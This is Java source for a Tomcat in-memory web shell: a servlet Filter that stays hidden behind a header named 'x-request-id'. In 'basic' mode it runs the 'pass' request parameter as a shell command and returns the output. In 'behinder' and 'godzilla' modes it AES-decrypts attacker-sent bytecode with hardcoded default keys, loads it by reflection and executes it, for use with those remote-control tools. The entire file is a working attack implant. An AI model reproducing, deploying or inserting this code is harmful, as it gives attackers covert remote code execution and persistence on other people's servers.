package http.payloads.memshell;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.tomcat.util.http.Parameters;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.*;

public class DynamicFilter implements Filter {
    private static final String FLAG = "x-request-id"; // basic || behinder || godzilla

    private static final String BH_KEY = "e45e329feb5d925b"; // rebeyond (default)

    private static final String PARAM = "pass";
    private static final String GZ_KEY = "3c6e0b8a9c15224a"; // key (default)

    Class gzAgentClass;
    String digest = md5(PARAM + GZ_KEY);

    public DynamicFilter() {
        super();
    }

    @Override
    public void init(FilterConfig filterConfig) {
    }

    @Override
    public void doFilter(
            ServletRequest req,
            ServletResponse resp,
            FilterChain filterChain
    ) throws IOException, ServletException {
        HttpServletRequest httpReq = (HttpServletRequest) req;

        if (httpReq.getHeader(FLAG).equalsIgnoreCase("basic")) {
            String input = req.getParameter(PARAM);
            if (input != null && !input.isEmpty()) {
                String[] cmd;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    cmd = new String[]{"cmd", "/C", input};
                } else {
                    cmd = new String[]{"/bin/sh", "-c", input};
                }
                String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                resp.getWriter().println(result);
            }
        } else if (httpReq.getHeader(FLAG).equalsIgnoreCase("behinder")) {
            Object rawReq = req;
            Object rawResp = resp;

            try {
                // see: https://github.com/rebeyond/Behinder/issues/187
                if (!(req instanceof RequestFacade)) {
                    Method getRequest = ServletRequestWrapper.class.getMethod("getRequest");
                    rawReq = getRequest.invoke(req);
                    while (!(rawReq instanceof RequestFacade))
                        rawReq = getRequest.invoke(rawReq);
                }
                if (!(resp instanceof ResponseFacade)) {
                    Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
                    rawResp = getResponse.invoke(resp);
                    while (!(rawResp instanceof ResponseFacade))
                        rawResp = getResponse.invoke(rawResp);
                }

                HttpSession session = ((RequestFacade) rawReq).getSession();
                HashMap<String, Object> pageContext = new HashMap<>();
                pageContext.put("request", rawReq);
                pageContext.put("response", rawResp);
                pageContext.put("session", session);

                if (httpReq.getMethod().equals("POST")) {
                    String input = req.getReader().readLine();
                    if (input == null || input.isEmpty()) {
                        StringBuilder tempInput = new StringBuilder();
                        // 拿到真实的 Request 对象而非门面模式的 RequestFacade
                        Field field = rawReq.getClass().getDeclaredField("request");
                        field.setAccessible(true);
                        Request realRequest = (Request) field.get(rawReq);
                        // 从 coyoteRequest 中拼接 body 参数
                        Field coyoteRequestField = realRequest.getClass().getDeclaredField("coyoteRequest");
                        coyoteRequestField.setAccessible(true);
                        org.apache.coyote.Request coyoteRequest = (org.apache.coyote.Request) coyoteRequestField.get(realRequest);
                        Parameters parameters = coyoteRequest.getParameters();
                        Field paramHashValues = parameters.getClass().getDeclaredField("paramHashValues");
                        paramHashValues.setAccessible(true);
                        LinkedHashMap paramMap = (LinkedHashMap) paramHashValues.get(parameters);

                        Iterator<Map.Entry<String, ArrayList<String>>> iterator = paramMap.entrySet().iterator();
                        while (iterator.hasNext()) {
                            Map.Entry<String, ArrayList<String>> next = iterator.next();
                            String paramKey = next.getKey().replaceAll(" ", "+");
                            ArrayList<String> paramValueList = next.getValue();
                            if (paramValueList.size() == 0) {
                                tempInput.append(paramKey);
                            } else {
                                tempInput.append(paramKey).append("=").append(paramValueList.get(0));
                            }
                        }
                        input = tempInput.toString();
                    }

                    session.setAttribute("u", BH_KEY);

                    byte[] payload = aes(b64de(input), BH_KEY, false);

                    URLClassLoader classLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
                    Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defMethod.setAccessible(true);
                    Class bhAgent = (Class) defMethod.invoke(classLoader, payload, 0, payload.length);

                    bhAgent.newInstance().equals(pageContext);
                }
            } catch (Exception ignored) {
            }
        } else if (httpReq.getHeader(FLAG).equalsIgnoreCase("godzilla")) {
            byte[] data = b64de(req.getParameter(PARAM));
            data = aes(data, GZ_KEY, false);
            try {
                if (gzAgentClass == null) {
                    URLClassLoader classLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
                    Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defMethod.setAccessible(true);
                    gzAgentClass = (Class) defMethod.invoke(classLoader, data, 0, data.length);
                } else {
                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                    Object agent = gzAgentClass.newInstance();
                    agent.equals(out);
                    agent.equals(data);
                    agent.equals(req);
                    resp.getWriter().write(digest.substring(0, 16));
                    agent.toString();
                    resp.getWriter().write(b64en(aes(out.toByteArray(), GZ_KEY, true)));
                    resp.getWriter().write(digest.substring(16));
                }
            } catch (Exception ignored) {
            }
        } else {
            filterChain.doFilter(req, resp);
        }
    }

    private String b64en(byte[] input) {
        return Base64.getEncoder().encodeToString(input);
    }

    private byte[] b64de(String input) {
        return Base64.getDecoder().decode(input);
    }

    private String md5(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            md.update(input.getBytes(), 0, input.length());
            return new BigInteger(1, md.digest()).toString(16).toUpperCase();
        } catch (NoSuchAlgorithmException ignored) {
            return null;
        }
    }

    private byte[] aes(byte[] input, String key, boolean isEncrypt) {
        try {
            Cipher cipher = Cipher.getInstance("AES");
            cipher.init(isEncrypt ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
            return cipher.doFinal(input);
        } catch (Exception e) {
            return null;
        }
    }

    @Override
    public void destroy() {
    }
}
